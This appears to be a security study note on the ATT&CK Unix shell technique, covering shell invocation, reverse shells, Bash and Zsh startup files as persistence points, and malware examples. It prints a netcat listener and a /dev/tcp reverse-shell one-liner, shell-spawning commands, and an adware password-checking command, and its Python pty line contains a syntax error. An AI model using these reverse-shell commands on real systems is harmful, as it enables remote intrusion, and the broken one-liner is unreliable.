---
title: "Command and Scripting Interpreter: Unix Shell (T1059.004)"
date: 2022-06-23T20:17:09-04:00
draft: false
---
# Command and Scripting Interpreter: Unix Shell

[T1059.004](https://www.notion.so/T1564-004-7d6a2ff19f994283b4238ecb5eb99bcd)

*Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.*

# Invocation

### Interactive Shell

An ***interactive*** shell is one started without non-option arguments and without the **-c** option whose standard input and error are both connected to terminals (as determined by **[isatty](https://linux.die.net/man/3/isatty))**, or one started with the **`-i`** option. **PS1** is set and **$-** includes **`i`** if **bash** is interactive, allowing a shell script or a startup file to test this state. An interactive shell will execute both `/etc/profile` and `/etc/bash.bashrc`.

To spawn an interactive shell:

`python -c 'import pty: pty.spawn("/bin/sh")'`

`echo os.system('/bin/bash')`

`/bin/sh -i`

An *interactive **login** shell *****is when bash is spawned by login in a TTY, SSH daemon, or similar means like using `-l` or `--login`. 

An *interactive **non-login** shell* does not source `~/.bash_profile`. For example, if you login to bash using PuTTY, you enter an *interactive **login shell*.** Then, if you type `bash` after, you switch to an *interactive **non-login*** shell. 

### Non-Interactive Shell

A *non-interactive* shell is used when a user cannot interact with the shell like executing a bash script. Within a non-interactive shell, only `/etc/bash.bashrc` is executed.

### Options

| Flag | Description |
| --- | ------ |
| -c | Commands are read from string and if arguments are after the string, they are assigned positional parameters, starting with $0.  |
| -i | The shell becomes interactive. |
| -l | Invokes bash as a login shell. |

### Reverse Shell

A reverse shell is a shell session established on a connection initiated from a remote machine. RCE vulnerabilities can be exploited to use a reverse shell to obtain an interactive shell session on the target machine. If a host is directly accessible, an attacker can create a bind shell between an attacker controlled machine and a remote network host. If the remote host isn’t directly accessible due to a firewall or NAT, a reverse shell would be used. The target initiates an outgoing connection to a listening network host to establish a shell session.

An attacker could create a netcat listener on a specified port.

- `ncat -l -p 1111`

With remote code execution ability on the victim machine, the attacker would execute a shell command to connect back to the listener.

- `/bin/bash -i >& /dev/tcp/<ip>/port 0>&1`

List of reverse shells: [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

# Zsh

Zsh is derived from the Bourne family of shells. It can be used as an interactive login shell and interpreter for shell scripting, but serves as an extension to the standard Bourne shell (bash) with improvements and additional features. Oh-My-Zsh is a popular Zsh framework for managing configurations. Zsh ignores the bash configuration files (`.bash_profile` or `.bashrc`). 

For persistence, Zsh is important as it is has been the default shell on macOS since 10.15 Catalina. 

For compatibility, existing `bash` scripts can be moved to `zsh` by setting the shebang in the script to `#!/bin/zsh`. Additional features with `zsh` include arrays and associative arrays which are like dictionaries. 

# Configuration Files

### Bash

**/etc/profile**

Sets system wide environment variables on user shells from `/etc/profile.d/*.sh` and `/etc/bash.bashrc`. Executed only for **interactive** **login** shells or **non-interactive** shells with the `--login` option. This is the system wide version of `.bash_profile`. Both `.profile` and `.bash_profile` set environment variables such as `umask` or `PATH` for users. 

**~/.bash_profile**

Used in **interactive login** shells and operates on a per-user basis after `/etc/profile`. If `/etc/profile` isn’t found, `~/.bash_login` and `~/.profile` are checked in order. 

**/etc/profile.d**

`/etc/profile` will execute scripts within `/etc/profile.d/*.sh`. Configurations within a shell script to set system wide environment variables should be placed within `/etc/profile.d`. 

**/etc/bashrc**

This file sets command aliases and functions used by individual bash shell users. `/etc/bashrc` and `/etc/bash.bashrc` is the system wide version of `.bashrc`. This file is executed for both **interactive** and **non-interactive** shells, not **login** shells. In Ubuntu, `/etc/profile` calls `/etc/bashrc` directly.

**~/.bash_logout**

Used in **interactive login** shells after exit of a login shell. 

### Zsh

Global config files are located within the `/etc/` folder and user-specific files are within `~/.z*`. 

Zsh will always start with `/etc/zshenv`, then the user specific `.zshenv`. 

**Conditions:**

For login shells, zsh will then run `/etc/zprofile` and `.zprofile`. 

For interactive **and** login shells, `/etc/zshrc` and `.zshrc`. All configurations should be placed here, or `.zlogin` for user-specific **login** shells. 

For just login shells, `/etc/zlogin` and `.zlogin`. 

When a login shell exits, `.zlogout` is read first, then `/etc/zlogin`. 

| Path | File | Description |
| --- | --- | ------ |
| /etc/zshenv | .zshenv | Supports login shell, interactive shell, scripts, and Terminal.app |
| /etc/zprofile | .zprofile | Supports login shell and Terminal.app |
| /etc/zshrc | .zshrc | Supports login shell, interactive shell, and Terminal.app |
| /etc/zlogin | .zlogin | Supports login shell and Terminal.app |
| /etc/zlogout | .zlogout | Supports login shell and Terminal.app |

# Examples

[MacOS Bundlore](https://mackeeper.com/blog/macos-bundlore-adware-analysis/) (Adware) verifies if a password is valid

- `bin/sh -c echo $'password' | sudo -S echo __tbt_true 2>&1`

[Anchor](https://medium.com/stage-2-security/anchor-dns-malware-family-goes-cross-platform-d807ba13ca30) drops payloads to `/tmp/<random_15_chars>`and executes via `sh`. 

[Chaos](https://www.gosecure.net/blog/2018/02/14/chaos-a-stolen-backdoor-rising/) provides a reverse shell connection on 8338/TCP, encrypted via AES. 

# References

- [https://bencane.com/2013/09/16/understanding-a-little-more-about-etcprofile-and-etcbashrc/](https://bencane.com/2013/09/16/understanding-a-little-more-about-etcprofile-and-etcbashrc/)
- [https://wiki.archlinux.org/title/Bash#Invocation](https://wiki.archlinux.org/title/Bash#Invocation)
- [https://linux.die.net/man/1/bash](https://linux.die.net/man/1/bash)
- [https://tldp.org/LDP/abs/html/intandnonint.html](https://tldp.org/LDP/abs/html/intandnonint.html)
- [https://mackeeper.com/blog/macos-bundlore-adware-analysis/](https://mackeeper.com/blog/macos-bundlore-adware-analysis/)
- [https://medium.com/stage-2-security/anchor-dns-malware-family-goes-cross-platform-d807ba13ca30](https://medium.com/stage-2-security/anchor-dns-malware-family-goes-cross-platform-d807ba13ca30)
- [https://www.netsparker.com/blog/web-security/understanding-reverse-shells/](https://www.netsparker.com/blog/web-security/understanding-reverse-shells/)
- [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [https://scriptingosx.com/2019/06/moving-to-zsh-part-2-configuration-files/](https://scriptingosx.com/2019/06/moving-to-zsh-part-2-configuration-files/)
